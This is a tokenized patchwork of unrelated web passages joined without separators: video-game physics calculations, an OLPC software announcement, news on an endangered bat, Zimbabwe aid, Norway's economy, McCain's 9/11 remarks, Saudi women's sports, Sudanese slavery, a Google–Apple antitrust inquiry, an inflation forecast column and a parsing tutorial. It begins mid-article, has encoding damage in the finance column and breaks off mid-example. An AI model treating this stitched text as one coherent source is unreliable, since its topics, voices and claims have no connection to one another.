At the third pace , " jogging , " C.J. crossed the span in 2:43.16 .
If he held that pace he would run a marathon in under two hours , which is unprecedented .
Holding down the A button , C.J. crossed the bridge in 1:38.11 , or 21 miles per hour .
That 's a mile in 2:44.84 , which is inhuman .
Remember Roger Bannister ?
The first mile under 4 minutes ?
C.J. would run the first one under three .
He would beat the world record holder by a larger margin ( in seconds ) than he would have lost this year 's Kentucky Derby .
Sprinting
Rapid - tapping the A - button gave C.J. just a 16 - second advantage , which means this loses its effect pretty quickly .
Still , at minimum one can assume some world - class sprint times .
How world class ?
Try torching Usain Bolt 's records in the 200 and 100 by two and one seconds , respectively - 17.1 and 8.58 seconds .
Granted , that speed figure is derived from a running start .
Real - life sprinters have to react to a gun and get up to speed .
But , remember , C.J. 's sprint lost effect , I 'm not sure exactly how far in , so most of this time was derived from a run at the standard " A " pace .

Incidentally , C.J. 's motion capture actor was Eddie Goines , a star wide receiver at North Carolina State University and a classmate of mine .
I knew him pretty well , as well as a sports writer knows one of the team 's stars , anyway .
As a flanker , he set all the receiving records that Torry Holt and Koren Robinson would later break .
As a freshman , Eddie was the fastest on the team , clocking a 40 yard dash in 4.35 .
A 4.09 is thought to be the NFL record .
CJ 's time is 3.15 .
I 'm sure Eddie would be delighted to know that , at least in a video game , he 's by far the fastest human alive .
MOMENTUM
Game : Assassin's Creed
Test Subject : Altair
Advertisement
No one would expect to fall 40 stories onto the top of a parked car and survive .
However , at least it stops the body from crashing all the way through to the ground .
Now imagine falling that height into a pile of hay that 's roughly 2 meters wide by a meter and a half tall .
That 's the first " leap of faith " in Assassin 's Creed , from the tower at Masayaf .
Holy catfish , that poor bastard who jumped with Altair at the beginning was lucky to get off with just a broken leg .
And it is far from the steepest drop in the game .
The infamous steeple on the cathedral at Acre is nearly twice as tall .
Fresh off our victory in San Fierro , the Kotaku Bureau of Weights & Measures set out not only to fix its height , but also to calculate how much hay you 'd need to land safely .
Advertisement
Ubisoft verified that Altair 's height and weight , for purposes of the game 's physics , was 6 feet and 190 pounds .
This would be useful in calculating his stop .
But that 's all we got from them .
However , one of the locations in the game is Jerusalem 's Dome of the Rock , whose dimensions are known .
The structure 's walls are 11 meters tall .
Putting all this information in the hand of a trained scientist - devoted reader Matt M. - we were able to come up with some good estimates .
Advertisement
Matt worked up all three heights , but let 's use Acre 's as it is the most impressive .
We were able to time the drop from the top of the steeple - 4.1 seconds - using this video ( which I downloaded and measured frame by frame ) .
Working backward , we found that its real - world height would be 82.37 meters - about 270 feet .
In the game , Altair is accelerating to 39.69 meters per second , acquiring a momentum of 3,420.48 kilogram - meters per second .
Advertisement
That 's certainly a large number , but what does it mean ?
Matt breaks it down :
Basically , whatever catches him has to has to reduce that momentum to zero in under 0.05 seconds , which is the difference in time between Altair falling 82.05 meters and falling 80.05 meters at that speed .
That means in the space of 2 meters - which is a little lenient since the floor of the cart is , what , half a meter off the ground ?
- the hay has to provide 68,298.25 Newtons of force .
It 's 136,596.5 Newton meters of work , which is a ridiculous thing to ask of hay .
Advertisement
Certainly , Kotaku Weights & Measures does not want to be unreasonable in its dealings with dead vegetable matter .
And I 'm not sure what could provide that kind of stopping power in that space , other than Kevlar .
Or pavement .
So I asked Matt if he could figure how large a haystack would be required to cushion a fall from such a height .
We used the elasticity of military - grade bungee cords as a guide ( using specs found here ) .
Advertisement
In the case of Acre , the haystack would be so big it would dwarf most other buildings in the game - 40 meters ( 131 feet ) at its point , 67 meters ( 219 feet ) wide at the bottom , if the dimensions conform to the original tiny pile .
The freefall into such a mass of hay would last only 2.87 seconds .
In terms of volume , it 's more than 2.7 million cubic feet of hay - 2,695 times greater than what Altair is leaping into .
I kept picturing Phil Hartman sitting atop the amazing mountain of Colon Blow cereal .
Alongside this you can see comparisons , to scale , of the heights Altair falls at the Dome of the Rock , Masayaf , and Acre , and of the size of hay he hits in the game relative to the size he would need to survive .
" Leap of Faith " indeed .
Sounds more like Altair 's in a suicide cult .

Some good news from OLPC : we ’ve decided to base the new XO - 1.5 laptop ’s software release on Fedora 11 .
Unlike previous releases , we plan to use a full Fedora desktop build , booting into Sugar but giving users the option to switch into a standard GNOME install instead .
( This will mostly be useful for older kids in high school . )
I ’m particularly happy about this plan because it will allow us to catch up with the awesome work present in the Sugar community ’s most recent release , Sugar 0.84 , as well as merging the latest Fedora work and including GNOME into the mix for the first time .
The new machines will have 1GB of RAM and 4GB of flash , so we have enough room for both environments at once .
We think we ’ll need to use our own kernel and initrd , but the other base packages we expect to need are present in Fedora already , including Sugar ; in fact , we already have an F11 + Sugar +GNOME build for the XO - 1 using pure Fedora packages .
That build will get better as a result of this work ( although OLPC ’s focus will be on getting the XO - 1.5 running ) and it will form the basis for the XO - 1.5 build .
If you ’re interested in contributing , we ’d certainly love your help , and you can find us on the fedora - olpc mailing list , and freenode IRC ’s # fedora - olpc channel .
Our existing F11 build images for the XO - 1 are here , and we ’ll soon begin publishing images for the XO - 1.5 too .
XO - 1.5 beta machines will start to be manufactured over the next few months , and will be available to contributors as part of our Contributors Program once the hardware ’s up and running .
Finally , thanks are due to the volunteer Fedora packagers and testers who helped us get to the point of being able to commit to Fedora 11 for this new build , in particular : Fabian Affolter , Kushal Das , Greg DeKoenigsberg , Martin Dengler , Scott Douglass , Sebastian Dziallas , Mikus Grinbergs , Bryan Kearney , Gary C. Martin , Steven M. Parrish , and Peter Robinson .
Thanks !

Australia 's rarest mammal , the Christmas Island pipistrelle bat , is months away from extinction , and wildlife experts say the government is failing to take action that could save the species .
A recent audit of the pipistrelle – a minuscule bat found only on Christmas Island , an Australian territory in the Indian Ocean – concluded that fewer than 20 individuals remain , all roosting under one piece of bark in the same tree .
Experts say the only way to rescue the species is to capture the surviving bats and breed them in captivity .
However , the Environment Minister , Peter Garrett , claims that would entail " unacceptably high risks " to the pipistrelle , which is not much bigger than the tip of a thumb .
Instead , he has set up a captive breeding trial involving a closely related micro-bat .
Download the new Independent Premium app Sharing the full story , not just the headlines
By the time the trial yields results , the pipistrelle will be extinct , according to Michael Pennay , president of the Australasian Bat Society .
Over the past 15 years , the population has fallen by 90 per cent .
" If it continues to decline at the same rate , the species will vanish altogether within months , " said Mr Pennay , a zoologist .
" It could happen in one day .
All it takes is for that tree to fall down – and it's a dead tree . "
Australia 's leading bat scientists are so concerned that they have drawn up a rescue plan and offered their services for free .
A team of experts is willing to travel to Christmas Island , capture the remaining bats and establish them in enclosures at a research station .
Mr Garrett has yet to respond .
Australia already has the worst mammal conservation record of any country .
Of all the species lost over the past 200 years , nearly half have been Australian .
They include the Tasmanian Tiger , or thylacine , which died out in the 1930s .
Thanks to conservation efforts , it is half a century since the last Australian mammal , a species of wallaby , became extinct .
Now , unless Mr Garrett has a change of heart , the pipistrelle looks likely to join the long list .
Bat experts accuse the government of dragging its feet .
The pipistrelle has been classified as critically endangered , the highest risk category , since 2006 .
Covered in soft fur , the creatures weigh less than a 10 p piece .
Contrary to popular perception about bats , they have excellent eyesight .
They also use a sonar - like system to navigate their surroundings .
Scientists have no idea why the population has decreased so catastrophically , but they theorise that disease , or introduced pests – which include black rats , yellow crazy ants , wolf snakes and giant centipedes – may be to blame .
Several other species native to Christmas Island have experienced steep declines , or disappeared .
Most of Christmas Island is a national park , so habitat loss is not a factor .
The island was annexed by Britain in the late 19th century ; sovereignty was transferred to Australia in 1958 , and nowadays about 1,500 people of Chinese , European and Malay ancestry live there .
Mr Pennay insisted that the government trial was unnecessary , since there was already plenty of evidence that micro-bats could thrive in captivity .
" The highest priority now is to secure these bats from whatever is threatening them , " he said .
" If you leave them in the wild , they 'll almost certainly go extinct . "

British Prime Minister Gordon Brown has announced an extra £ 5 m ( $ 8 m ) of aid to Zimbabwe after meeting his Zimbabwean counterpart Morgan Tsvangirai .
This takes the total this year to £ 60 m ( $ 98 m ) but Mr Brown said more money would only come after further reform .
He also said the aid would go through aid agencies , not the government in which Mr Tsvangirai shares power with President Robert Mugabe .
Zimbabwe says it needs $ 8 bn ( £ 4.9bn ) to revive its shattered economy .
Mr Tsvangirai has been on a tour of Europe and the US to ask for increased funding but many donors are still wary of sending money which could be misused by Mr Mugabe and his allies .
Under Mr Mugabe , relations between the UK and its former colony have become severely strained .
' Irreversible change ' Some £ 4 m ( $ 6.5 m ) of the new money is to be channelled into food aid and agriculture , with the rest towards buying text books for Zimbabwean schools .
Please turn on JavaScript .
Media requires JavaScript to play .
At their joint news conference in London , Mr Tsvangirai defended his decision to share power with President Mugabe in February .
Mr Tsvangirai said " irreversible change was now taking place in Zimbabwe towards a transition to democracy and elections " .
Mr Brown said it was the first time a British and a Zimbabwean prime minister had stood together in Downing Street for 25 years .
" I pay tribute today to your courage , your determination , your strength of character and your fortitude in this tragedy , " he said .
The British premier added : " There are great signs of progress , a budget and economic plan are in place , schools are reopening , children are once again filling the classrooms .
BBC ban lifted ?
" As a result of the progress , we will increase our support to help Zimbabwe move from mere survival towards a genuine recovery . "
ZIMBABWE AID PLEDGES Australia : $ 6.4 m ( £ 4.7 m ) World Bank : $ 22 m ( £ 14.4 m ) African nations : $ 650 m ( £ 400 m ) US : $ 73 m ( £ 44 m ) Germany : $ 35 m ( £ 21 m ) UK : $ 98 m ( £ 60 m ) Zimbabwe needs : $ 8bn ( £ 4.9bn )
' Why I booed Morgan Tsvangirai ' Viewpoint : Ambiguous trip Slideshow : Zimbabwe 's orphans
But he said that further money would only be forthcoming if " the reform programme on the ground gains momentum " .
He called for more economic reforms , an improvement in human rights , media freedom , the scrapping of repressive laws and an end to the invasion of white - owned farms , reports the Reuters news agency .
Mr Tsvangirai had been expected to ask Mr Brown to lift sanctions against Mr Mugabe and his officials but there was no change in this stance .
These include a travel ban and assets freeze .
Up to half the population - some four million people - is believed to need food aid after years of economic meltdown .
Mr Tsvangirai also told the news conference that he hoped the ban on the BBC operating in Zimbabwe would be rescinded soon .
He said media reforms were being implemented and that the BBC should " look forward to coming to operate in Zimbabwe openly , and not secretly " .
Last week , Amnesty International said that the human rights situation in Zimbabwe remained " precarious " despite the power - sharing government .
Opposition and civil rights activists continue to be arrested by the security forces , which are still largely controlled by Mr Mugabe 's Zanu - PF party .
On Saturday , Zimbabwe 's prime minister was booed by Zimbabwean exiles in London when he urged them to return to the country .
Many were bitter that , following years of outspoken opposition to the Zimbabwe government , he had decided to join it and offer public support to Mr Mugabe .
Mr Tsvangirai is due to round off his visit to Europe and the US - his first official tour since becoming prime minister - with a stop in Paris on Wednesday before returning home .

Norway ’s relative frugality stands in stark contrast to Britain , which spent most of its North Sea oil revenue  and more  during the boom years .
Government spending rose to 47 percent of G.D.P. , from 42 percent in 2003 .
By comparison , public spending in Norway fell to 40 percent from 48 percent of G.D.P .
“ The U.S. and the U.K. have no sense of guilt , ” said Anders Aslund , an expert on Scandinavia at the Peterson Institute for International Economics in Washington .
“ But in Norway , there is instead a sense of virtue .
If you are given a lot , you have a responsibility . ”
Eirik Wekre , an economist who writes thrillers in his spare time , describes Norwegians ’ feelings about debt this way : “ We can not spend this money now ; it would be stealing from future generations . ”
Image Friends meeting in an Oslo nightspot .
Norways economy grew 3 percent last year as many nations plunged into a recession .
Credit ... Espen Rasmussen for The New York Times
Mr. Wekre , who paid for his house and car with cash , attributes this broad consensus to as the country ’s iconoclasm .
“ The strongest man is he who stands alone in the world , ” he said , quoting Norwegian playwright Henrik Ibsen .
Still , even Ibsen might concede that it is easier to stand alone when your nation has benefited from oil reserves that make it the third - largest exporter in the world .
The money flowing from that black gold since the early 1970s has prompted even the flintiest of Norwegians to relax and enjoy their good fortune .
The country ’s G.D.P. per person is $ 52,000 , behind only Luxembourg among industrial democracies .
As in much of the rest of the world home prices have soared here , tripling this decade .
But there has been no real estate crash in Norway because there were few mortgage lending excesses .
After a 15 percent correction , prices are again on the rise .

We just released two big projects we have been working on for quite a while .
Mono 2.4 is a much faster , scalable and tuned version of Mono , like you have never seen before .
Major highlights from the previous release are documented in our release notes .
And MonoDevelop 2.0
And a brand new web site
I previously blogged about the list of all the new MonoDevelop 2.0 features .
The most visible one is the integrated debugger both for Mono applications and for C - based applications ( using GDB ) .

In addition to all the nice features in MonoDevelop 2.0 , Lluis migrated the web site for MonoDevelop from MediaWiki to the Mono - powered MindTouch Deki content management system .
Arizona Senator John McCain is the latest high - profile politician to repeat the diehard American falsehood that the Sept. 11 , 2001 , attackers entered the United States through Canada .
Just days after Janet Napolitano , the U.S. homeland security secretary , sparked a diplomatic kerfuffle by suggesting the perpetrators took a Canadian route to the U.S. eight years ago , McCain defended her by saying that , in fact , the former Arizona governor was correct .
" Well , some of the 9/11 hijackers did come through Canada , as you know , " McCain , last year 's Republican presidential candidate , said on Fox News on Friday .
The Arizona senator 's remarks prompted the Canadian embassy to immediately reissue remarks made Tuesday by Ambassador Michael Wilson , who reminded Americans once again that none of the attackers came to the U.S. via Canada .
" Unfortunately , misconceptions arise on something as fundamental as where the 9/11 terrorists came from , " Wilson said .
" As the 9/11 Commission reported in July 2004 , all of the 9/11 terrorists arrived in the U.S. from outside North America .
They flew to major U.S. airports .
They entered the U.S. with documents issued to them by the U.S. government .
No 9/11 terrorists came from Canada . "
Canadian embassy officials were also in touch with McCain 's office to set the record straight .
McCain recently visited the Canadian Embassy and had lunch with Wilson .
CBC interview with Napolitano
The normally reserved Wilson made his 9/11 remarks on Tuesday , a day after Napolitano suggested to the CBC's Neil Macdonald in a televised interview that the hijackers entered the U.S. from Canada .
She later said she had misunderstood a question asked during the interview and was well aware there had been no Canadian 9/11 connection , but added that the Canada - U.S. border had , in the past , posed a security risk to Americans .
The next day , Napolitano appeared at a border conference and suggested Canada was more lax in its immigration policies than the U.S. , alleging Canadian authorities allow people into the country that would not pass muster south of the border .
Napolitano has also ruffled diplomatic feathers with her insistence that the Canadian border must not be treated any differently than the U.S. - Mexican boundary , where a drug war rages and countless illegal immigrants flood into America every year .
McCain expressed some sympathy for Canada on that front on Friday .
" The difference , obviously , is , with all due respect to the Mexicans , there 's not corruption on our northern border , " he told Fox News .
" And , unfortunately , there is significant corruption , great corruption and drug cartels on our southern border . "
RIYADH , Saudi Arabia — Joseph Heller would have smiled .
It ’s another absurd predicament .
Government officials have begun notifying female - only sports clubs that they must shut down because they do n’t have licenses , according to Saudi press reports .
And they do n’t have licenses because ... ?
That ’s right !
No government department is authorized to issue licenses for female - only sports clubs .
The catch - 22 situation is another illustration of the barriers placed in the way of Saudi women who want to exercise and participate in sports .
Their opportunities to do so are extremely limited because the prevailing view among the country ’s influential religious leadership is that it is “ un - Islamic ” for females to be involved in athletic activities .
This bias against exercising women remains despite the medical community ’s warnings about rapidly rising rates of obesity and diabetes among Saudi youth .
" The idea of female fitness is non-existent within our government , " Fouziah Alouni , a prominent women 's rights campaigner , told Reuters .
" Depriving women of this is yet another way of marginalizing them . ”
The deprivation starts early .
Government schools for girls do not offer physical education classes as part of the curriculum .
There are no official sports teams at state - run women ’s universities .
Females do not ride bicycles in public , swim in pools outside their homes or participate in sports tournaments .
They also are not allowed in public stadiums when Saudi ’s beloved soccer teams play .
Last year , when King Saud University in Riyadh announced that it would sponsor an all - female walking marathon on campus to promote health awareness , the country ’s most senior religious official , Grand Mufti Sheikh Abdulaziz Al Alsheikh , ordered the university president to cancel the event .
Also , Saudi Arabia is one of the few countries in the world that has never had women in its official Olympic teams .
Last year , the kingdom was permitted to send five all - male teams to Beijing although the Olympic charter states that “ any form of discrimination ” is “ incompatible with belonging to the Olympic Movement . "
Clerical opposition to women doing sports does not stem from Islam .
Rather , it arises out of cultural attitudes long discredited in most other societies .
Some clerics have Victorian - era ideas that such activities are “ unfeminine . ”
Others display ignorance about the necessity of exercise to maintain health .
And some have suggested that exerting themselves in sports would be detrimental to women ’s honor .
“ Women need to have their dignity protected , ” Sheikh Abdullah Al Manee , a member of the government - appointed Council of Senior Ulema , or religious scholars , told the Saudi Gazette .
“ Sports such as football and basketball require a lot of movement which may cause young women to lose their virginity , which can cause them numerous problems later on . ”
Another Islamic scholar and blogger , Muhammed Al Habdan , wrote that physical education at girls ’ schools would require them to disrobe .
In addition , it might lead to “ the loss of the shyness that is characteristic of Muslim girls , ” and “ the eventual masculinization of women ” who will lose “ their innate female inclinations . ”
Al Habdan also suggested that such classes might contribute “ to the rising phenomenon of young women admiring one another lustfully in girls ' schools — especially since young women will begin to see one another 's svelte physiques . ”
Physical education classes , he added , would be the start of “ a slippery slope ” with Saudi Arabia “ following in the footsteps of Western countries ... by allowing women additional freedoms in sports .
Soon the state will inaugurate colleges dedicated to female sports , then they will hold national championships .
And to think that this brouhaha all began because women needed exercise and it just spiraled out of control . ”
Al Habdan does not hold a government position but his religious advice is followed by a significant segment of Saudi society .
Nevertheless , young women increasingly see the value , both aesthetic and medical , in regular exercise and sports .
In recent years , they have begun organizing informal soccer , basketball and volleyball teams that play on private properties — sometimes at weekend homes in the desert outskirts of Riyadh , sometimes in private school stadiums .
These semi-clandestine teams are most overt in Jeddah , the Red Sea port that is the country ’s most liberal city .
Lina Al Maeena , 30 , is founder of Jeddah United basketball team whose players are mostly students and housewives .
She said in an interview that she had seen “ drastic changes ” in the mental health of women who had come to play regularly — many of them in headscarves , long pants and long - sleeved shirts .
She recalled how one girl who was suffering from anorexia “ just blossomed ” and “ is one of our most amazing players . ”
Other girls who were on antidepressants no longer needed them because “ their seratonin levels just went up naturally ” during dribbling and shooting on the court , Al Maeena said .
“ People think sport is only for losing weight , ” said Lamis Darwish , a tall , slender 20 - something who exercises several days a week at Impact , an all - women ’s gym attached to a downtown Riyadh medical facility .
But Darwish says she also does it for her mental health .
“ It makes me happy , all the bad energy comes out , ” she said .
Sports clubs like Impact are licensed because they are associated with hospitals or medical centers .
But these facilities are scarce , and usually too expensive for most young women .
In an effort to meet the growing demand for women ’s exercise facilities , some entrepreneurs have opened establishments that they describe to licensing authorities as “ beauty salons , ” or “ natural treatment centers ” because they know that they cannot get licensed as all - female gym .
These facilities are the ones now being threatened with closure because they are not properly “ licensed . ”
And yet , officials admit , no government department — including the one that issues licenses for men ’s gyms — is authorized to license women ’s gyms .
After this was recently highlighted in the press , some members of the Shura Council , the state - appointed advisory body , expressed dismay that their recommendation several years ago to open all - female exercising facilities had not been implemented and they urged the government to do so .
But cleric Al Manee from the Council of Senior Ulema told the Saudi Gazette that the “ decision on whether to permit sports clubs for women requires a ruling ” from the Council .

Sudan : Aid Groups Frees 232 Christian Slaves Share Tweet
June 8 , 2009
( ANS ) -- A Christian humanitarian organization has issued a report on the liberation of 232 Sudanese earlier this month .
Christian Solidarity International ( CSI ) says the slaves -- Christian and traditionalist members of the Dinka tribe -- were liberated , with CSI ’s support , from Arab masters in Darfur and neighboring Kordofan .
A CSI media advisory says the released captives were then repatriated to their homeland in Southern Sudan by Arab retrievers working in association with local Arab - Dinka Peace Committees .
The news release says : " The enslavement of these Black non-Muslim Sudanese took place during jihad raids undertaken by Arab militias backed by Sudan ’s Islamist government during the late North - South civil war ( 1983-2005 ) .
" Interviews with all 232 slaves conducted by CSI representatives reveal a clear pattern of physical and psychological abuse .
The liberated slaves reported having been subjected to beatings , death threats , rape ,
female genital mutilation , forced conversion to Islam , racial and religious insults and work without pay .
Some slaves reported witnessing the execution of fellow captives . "
In a letter to President Barack Obama , Dr. John Eibner , CEO of CSI - USA , recalled the crucial roles played by Ambassador Susan Rice , while Assistant Secretary of State for African Affairs , in initiating government policy to eradicate Sudanese slavery during the Clinton administration , and by President Bush ’s first Special Envoy for Sudan , Sen .
John Danforth in placing the issue of slavery at the heart of the Sudan peace process .
Dr. Eibner furthermore urged President Obama to " revive America ’s commitment to act energetically for the eradication of slavery in Sudan " by supporting the reintroduction of legislation sponsored by Reps.
Chris Smith ( R - NJ ) and Diane Watson ( D - CA ) for the establishment of the United States Commission to Monitor Slavery and its Eradication in Sudan ( Eradication of Slavery in Sudan Act of 2007 . H.R.3844 ) .
According to CSI , " Slavery persists in Sudan , despite the signing in January 2005 of the Comprehensive Peace Agreement ( CPA ) between the Islamist Government of Sudan ( GOS ) and the secular , Southern - based Sudan People ’s Liberation Army ( SPLM ) .
The Agreement failed to include a mechanism for overseeing the liberation of slaves and their safe repatriation . "
CSI states : " An estimated 35,000 Black Africans from the Dinka tribe remain enslaved today , according to a member of the Government of Sudan ’s Committee for the Eradication of the Abduction of Women and Children ( CEAWC ) , James Aguir .
( Skye Wheeler , Reuters , ' Misseriya and Dinka Grapple with History of Child Abduction , ' Aweil , November 14 , 2008 . ) . "
Most of these Dinka slaves are held by masters in Darfur and neighboring Kordofan , CSI said .
CSI further says that reports from the UN Secretary General ’s International Commission of Inquiry on Darfur ( January 2005 ) and from the Darfur Consortium ( December 2008 ) also confirm the use of slavery as a weapon of war against Black Africans in Darfur .
CSI concludes : " The enslavement and horrific abuse of Sudanese captives of the Lord ’s Resistance Army is yet another facet of Sudan ’s slavery problem . "

Google has attracted the attention of anti-trust regulators in recent weeks The Federal Trade Commission is looking into the ties between the boards of Apple and Google , according to reports .
The New York Times said the inquiry involving Google and Apple centres on a possible breach of anti-trust laws .
Google boss Eric Schmidt and former Genentech boss Arthur Levinson sit on the boards of both companies .
The Clayton Anti-trust Act of 1914 forbids a person to be on a board of two rival firms at once if it reduces competition between them .
Apple and Google both offer competing web browsers and phone operating systems .
However they have worked together , most recently to design versions of some of Google 's services like Gmail and Google Maps for the iPhone .
Legal experts say the issue is rarely pursued partly because it is difficult to prove how overlapping directors impinge on business decisions .
" Government actions under Section 8 are rare , but they are brought under circumstances when the presence of a common director on competing boards is likely to be anticompetitive , " Andrew I. Gavil from the Howard University School of Law told the New York Times .
One easy solution to the problem would be for either director to step down from one of the two boards .
Google , Apple and the FTC have all refused to comment on the report .
' Monopoly '
This is the second anti-trust inquiry to involve Google in recent days .
Last week the Department of Justice started its own investigation into the company 's $ 125 m ( £ 82.7 m ) settlement with authors and publishers to digitise millions of books and make them available online .
Despite competing products Google and Apple have also worked together Christine Varney , the assistant attorney general for the Justice Department 's anti-trust division has said that she is concerned about Google 's power , particularly in the online advertising space .
Comments she made at an earlier panel discussion sponsored by the American Anti-trust Institute were resurrected when she was nominated to be the US 's next anti-trust chief .
" For me , Microsoft is so last century .
They are not the problem , " Ms Varney said at the time .
Last week , Google 's Mr Schmidt was appointed to President Obama 's Council of Advisors on Science and Technology , a 20 - member group that will help formulate policy in a number of areas " where understanding of science , technology and innovations is key to strengthening the economy " .

BIG PICTURE � Global central banks are waging an all - out inflationary war on the ongoing credit contraction .
The establishment is attempting to thwart the post - bubble deflationary forces via record - low interest rates , deficit spending and quantitative easing ( buying assets from newly created money ) .
Over the past 18 months , the post - bubble contraction had the upper hand as it decimated asset prices all over the world .
However , it seems to me as though the consequences of monetary inflation and central bank sponsored debasement are finally starting to dominate .
A few days ago , in a bold move , the Federal Reserve announced that it would buy US $ 1 trillion worth of US Treasuries and mortgage - backed agency debt .
Apparently , the idea behind this measure is to subdue long - term interest rates in the US , thereby assisting homeowners .
However , any serious investor should realise that this line of thinking is totally flawed .
Allow me to explain :
By announcing to the entire world that the Federal Reserve is ready and willing to buy US Treasuries and other agency debt , the Federal Reserve is hoping to support the US bond market and suppress long - term interest - rates .
Unfortunately , in order to buy these assets , the Federal Reserve will end up creating even more dollars and the result will be the exact opposite of what the officials set out to do !
As the Federal Reserve steps up its buying of US government debt , it would have to create money out of thin air .
When this occurs , inflationary expectations will rise and nervous bond investors will automatically demand higher interest - rates in order to protect themselves from inflation .
So , as an inflation - premium sets in the market , bond investors will reset interest - rates at a much higher level !
It is worth noting that the US establishment engaged in the same misguided policy roughly 60 years ago and the result was much higher interest - rates and that saga morphed into the inflationary holocaust of the late 1970�s .
This time around , the Federal Reserve is making the same mistake and ( once again ) the end result will be an inflationary tsunami !
In fact , I would argue that by buying US Treasuries after a 28 - year bull - market in US government bonds , the Federal Reserve is following in the foot steps of the Bank of England which infamously sold all of Britain �s gold at the lows of a 21 - year bear - market .
Never underestimate the genius of central banking !
Make no mistake , Federal Reserve Chairman � Mr. Bernanke has studied the Great Depression of the 1930�s and he is now in charge of the printing press !
You can bet anything you want that he will continue to flood the banking system with trillions of newly created dollars .
As and when this additional money works its way into the economy , asset prices will rise .
It is worth noting that both the supply of money and credit in the US continue to expand at a furious pace .
Despite the ongoing secular deleveraging in the private - sector , total credit in the US is still expanding due to the frantic borrowing efforts of the US establishment .
Although the private - sector credit bubble in the US burst last year , Mr. Obama�s administration is borrowing enough money to more than offset the private - sector credit contraction .
There can be no doubt that this development is extremely inflationary and will cause commodity and consumer prices to sky - rocket in the years ahead .
Throughout recorded history , massive surges in the supply of money and credit have always led to rising prices in some parts of the economy and there is no reason to conclude that this time should be any different .
Today , there are many deflationists who are claiming that the prices will remain depressed for many years due to the weak economic activity .
However , these folks should note that even during the Great Depression of the 1930�s , prices of commodities stabilised and began rising in 1933 .
Figure 1 confirms that due to monetary inflation in the early 1930�s , the CRB Index embarked on a secular bull - market which had a violent correction in 1937 ( marked by purple arrow ) .
Following that crash , commodities bottomed out in 1938 and thanks to the super - inflationary efforts of President Roosevelt , the CRB Index surged for more than a decade .
Figure 1 : CRB Spot Index � ( 1930 - 2007 ) Source : Commodities Research Bureau Contrary to popular opinion , that huge commodities boom took place despite an economic depression .
Furthermore , it is worth pointing out that commodities rose relentlessly despite the fact that private - sector debt and bank lending remained essentially flat until 1945 .
Back then , similar to the current situation , banks accumulated large reserves but didn�t loan these reserves into the broad economy .
However , from 1932 onwards , the US government borrowed so much new money into existence that prices began to rise way before private - sector credit started to expand .
A similar drama unfolded in the 1970�s when commodities went through the roof .
During that time , economic activity was dismal but governments decided to tackle the recession with money creation .
The net result was surging hard asset prices and mind - numbing inflation !
Turning to the present situation , US private - sector debt is shrinking as banks remain fearful of lending .
However , the US government ( along with other nations ) is borrowing and creating gigantic sums of money and this should cause prices to rise for the next 3 - 4 years .
Accordingly , we are maintaining our positions in top-quality businesses in the resources sector .
Finally , in the short - term , most metals are over - bought and the usual summer correction will probably unfold .
So , investors may want to wait for a pullback before adding to their positions .
Precious metals have a tendency to form an important top during spring and it is likely that we may see lower prices in the weeks ahead .

Previous Articles
This is the first in a series of articles about Trace Based Parsing ( TBP ) .
Trace based parsing is a powerful top down , table driven parsing style .
TBP is the technique underlying Trail which is the parser generator of EasyExtend ( EE ) .
At its core Trail uses a variant of regular expression matching engines of the Thompson style described in an excellent article by Russ Cox .
However Trail extends the scope of those engines and goes beyond regular expressions and covers context free grammars and programming languages .
Originally I did n’t intend to create a parser generator let alone a novel one that was n’t described by the literature that was available to me .
EasyExtend used a very efficient LL ( 1 ) parser generator written by Jonathan Riehl and what I needed was something more modest namely a parse tree validator for checking the correctness of parse tree transformations .
Those validators are simpler to create than parsers and I ’ll start my introductory notes about TBP describing them .
Parse Tree Validators
Suppose an EasyExtend user has defined a few new grammar rules in an extension language ExtL Python of Python .
The ExtL Python source code is parsed correctly into a parse tree PT ( ExtL Python ) and now the user wants to transform PT ( ExtL Python ) back into a Python parse tree PT ( Python ) which can be compiled to bytecode by means of the usual compiler machinery .
In essence the function PT ( ExtL Python ) → PT ( Python ) is a preprocessor of the users language and the preprocessors , not the bytecode compiler , are defined within EE and need to be checked .
So the task we need to solve can be stated as
Given a parse tree PT and a grammar G check that PT is conformant with G .
An EBNF grammar of Pythons parser is already available in the Python distribution and can be found in the distributions / Grammar folder or here ( for Python 2.5 ) .
We will start the derivation of a parse tree validator considering simple grammars .
Take the following grammar G1 for example :
Grammar G1
---------- G1 : A B | A C
The possible parse trees of a language described by G1 have the following shape :
[ G1 , A , B ] or [ G1 , A , C ] .
Our next grammar is just slightly more involved
Grammar G2 ---------- G2 : A R R : B B C | B B D
The corresponding trees are :
TG1 = [ G2 , A , [ R , B , B , C ] ]
TG2 = [ G2 , A , [ R , B , B , D ] ] .
The function ( or object method ) I seek steps through the parse tree and determines for every node in the tree the set of all possible subsequent nodes .
This function shall be called a tracer .
Given the grammar G2 and the symbol A the tracer shall yield the symbol R .
If the symbol is B the yielded follow symbol is either B or those are the symbols C and D depending on the state of the tracer .
A tracer can be best implemented using a finite state automaton .
For the grammar G2 we derive following states and state transitions in the automaton :
( G2 , 0 ) : ( A , 1 ) ( A , 1 ) : ( R , 2 ) ( R , 2 ) : ( B , 3 ) , ( B , 4 ) ( B , 3 ) : ( B , 5 ) ( B , 4 ) : ( B , 6 ) ( B , 5 ) : ( C , 7 ) ( B , 6 ) : ( D , 8 ) ( C , 7 ) : ( None , '-' ) ( D , 8 ) : ( None , '-' )
In this automaton we have encoded the symbols of the grammar rules as 2 - tuples ( symbol - name , index ) .
The index is arbitrary but important to distinguish different states in the automaton originating from the same symbol that is used at different locations .
In G2 the symbol B gives rise to four different states ( B , 3 ) , ( B , 4 ) , ( B , 5 ) and ( B , 6 ) .
The finite state automaton is non-deterministic .
That ’s because each transition is described by the symbol name only .
So if the automaton is in the state ( A , 1 ) the symbol R is the label of the transition : ( A , 1 ) → R → ( R , 2 ) .
The subsequent transition is
( R , 2 ) → B → [ ( B , 3 ) , ( B,4 ) ] .
This particular transition does n’t yield a unique state but a set of states .
Hence the non-determinism .
Nondeterministic finite state automatons are abbreviated by NFA .
For all states S in a state set we can safely assume that S [ 0 ] = symbol - name for a fixed symbol name .
In essence our tracing function produces state sets on each transition and those sets are uniquely determined by symbol names .
State views and selection views
The parse trees TG1 and TG2 from the previous section correspond with following traces which describe state transition sequences :
Trace ( TG1 ) = ( G2,0 ) → A → ( A , 1 ) → R → ( R , 2 ) → B → [ ( B , 3 ) , ( B , 4 ) ] → B → [ ( B , 5 ) , ( B , 6 ) ] → C → ( C , 5 ) → ( None , ‘-‘)
